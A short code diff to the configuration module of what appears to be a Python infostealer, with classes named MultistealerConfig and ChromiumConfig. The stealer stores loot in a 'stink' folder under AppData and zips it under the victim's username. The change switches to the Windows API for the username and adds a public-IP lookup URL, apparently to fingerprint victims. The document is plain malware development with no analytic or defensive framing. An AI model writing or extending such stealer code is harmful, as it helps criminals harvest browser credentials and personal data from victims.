@@ -1,5 +1,5 @@
 from os import environ
-from getpass import getuser
+from win32api import GetUserName
 from dataclasses import dataclass
 
 
@@ -15,7 +15,7 @@ class ChromiumConfig:
 @dataclass
 class MultistealerConfig:
 
-    User: str = getuser()
+    User: str = GetUserName()
     ZipName: str = f"{User}-st"
     StoragePath: str = rf"{environ['USERPROFILE']}\AppData"
     StorageFolder: str = "stink"
@@ -66,9 +66,9 @@ class MultistealerConfig:
 @dataclass
 class SystemConfig:
 
-    User: str = getuser()
+    User: str = GetUserName()
     Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
-    ProcessesDescription: str = "[Startup time] [Status] [CPU %] [RAM %] [Name]\n"
+    IPUrl: str = "https://api.ipify.org/"
 
 
 @dataclass
